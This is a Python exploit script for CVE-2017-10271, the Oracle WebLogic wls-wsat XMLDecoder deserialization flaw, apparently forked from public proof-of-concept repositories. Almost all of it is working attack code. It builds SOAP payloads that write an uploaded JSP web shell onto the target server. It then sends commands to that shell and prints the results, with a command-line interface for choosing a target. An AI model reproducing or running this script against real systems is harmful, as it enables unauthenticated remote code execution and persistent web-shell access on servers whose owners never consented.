#!/usr/bin/env python
# coding:utf-8
import requests
import argparse
import time
import base64

'''
forked from https://github.com/s3xy/CVE-2017-10271  https://github.com/hanc00l/weblogic_wls_wsat_rce/
Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: WLS Security). 
Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. 
Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server
Modified by hanc00l
'''
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
headers = {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
timeout = 5
'''
payload的格式化
'''


def payload_command(shell_file, output_file):

    html_escape_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }
    with open(shell_file) as f:
        shell_context = f.read()
    command_filtered = "<string>" + "".join(html_escape_table.get(c, c) for c in shell_context) + "</string>"
    payload_1 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java>
    <java version="1.6.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter">
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/{}</string>
    <void method="println">{}</void><void method="close"/>
    </object>
    </java>
    </java>
    </work:WorkContext>
    </soapenv:Header><soapenv:Body/></soapenv:Envelope>'''.format(output_file, command_filtered)

    return payload_1


def payload_command2(shell_context, output_file):

    html_escape_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }

    command_filtered = "<string>" + "".join(html_escape_table.get(c, c) for c in shell_context) + "</string>"
    payload_1 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java>
    <java version="1.6.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter">
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/{}</string>
    <void method="println">{}</void><void method="close"/>
    </object>
    </java>
    </java>
    </work:WorkContext>
    </soapenv:Header><soapenv:Body/></soapenv:Envelope>'''.format(output_file, command_filtered)

    return payload_1


'''
命令执行
'''


def execute_cmd(target, output_file, command):
    print 123
    if not target.startswith('http'):
        target = 'http://{}'.format(target)
    # url增加时间戳避免数据是上一次的结果缓存
    output_url = '{}/bea_wls_internal/{}?{}'.format(target, output_file, int(time.time()))
    data = {'c': command}
    try:
        r = requests.post(output_url, data=data, headers=headers, proxies=proxies, timeout=timeout)
        if r.status_code == requests.codes.ok:
            return (True, r.text.strip())
        elif r.status_code == 404:
            return (False, '404 no output')
        else:
            return (False, r.status_code)
    except requests.exceptions.ReadTimeout:
        return (False, 'timeout')
    except Exception, ex:
        # raise
        return (False, str(ex))


'''
RCE：上传命令执行的shell文件
'''


def weblogic_rce(target, cmd, output_file, shell_file):
    #proxies = None

    if not target.startswith('http'):
        target = 'http://{}'.format(target)
    url = '{}/wls-wsat/CoordinatorPortType'.format(target)
    print target
    # content-type必须为text/xml
    payload_header = {'content-type': 'text/xml',
                      'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
    msg = ''
    try:


        r = requests.post(url, payload_command(shell_file, output_file), headers=payload_header, verify=False,
                          timeout=timeout, proxies=proxies)
        print r.status_code
        # 500时说明已成功反序列化执行命令
        if r.status_code == 500:
            print 500
            return execute_cmd(target, output_file, cmd)
        elif r.status_code == 404:
            return (False, '404 no vulnerability')
        else:
            return (False, '{} something went wrong'.format(r.status_code))
    except requests.exceptions.ReadTimeout:
        return (False, 'timeout')
    except Exception, ex:
        # raise
        return (False, str(ex))



def weblogic_rce2(target, output_file, shell_file):
    #proxies = None
    print target
    if not target.startswith('http'):
        target = 'http://{}'.format(target)
    url = '{}/wls-wsat/CoordinatorPortType'.format(target)
    print target
    # content-type必须为text/xml
    payload_header = {'content-type': 'text/xml',
                      'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
    msg = ''
    try:


        r = requests.post(url, payload_command2(shell_file, output_file), headers=payload_header, verify=False,
                          timeout=timeout, proxies=proxies)
        print r.status_code
        # 500时说明已成功反序列化执行命令
        if r.status_code == 500:
            print 500
            return (True,'upload success')
        elif r.status_code == 404:
            return (False, '404 no vulnerability')
        else:
            return (False, '{} something went wrong'.format(r.status_code))
    except requests.exceptions.ReadTimeout:
        return (False, 'timeout')
    except Exception, ex:
        # raise
        return (False, str(ex))



'''
main
'''


def main():
    global proxies

    parse = argparse.ArgumentParser()
    parse.add_argument('-t', '--target', required=True,
                       help='weblogic ip and port(eg -> 172.16.80.131:7001 or https://172.16.80.131)')
    parse.add_argument('-c', '--cmd', required=False, default='whoami', help='command to execute,default is "whoami"')
    parse.add_argument('-o', '--output', required=False, default='output.jsp',
                       help='output file name,default is output.jsp')
    parse.add_argument('-s', '--shell', required=False, default='exec.jsp', help='local jsp file name to upload')
    parse.add_argument('--proxy', action='store_true', default=False, help='use proxy')
    args = parse.parse_args()

    # 是否使用proxy
    if not args.proxy:
        proxies = None
    status, result = weblogic_rce(args.target, args.cmd, args.output, args.shell)
    # output result:
    if status:
        print result
    else:
        print '[-]FAIL:{}'.format(result)


if __name__ == '__main__':
    main()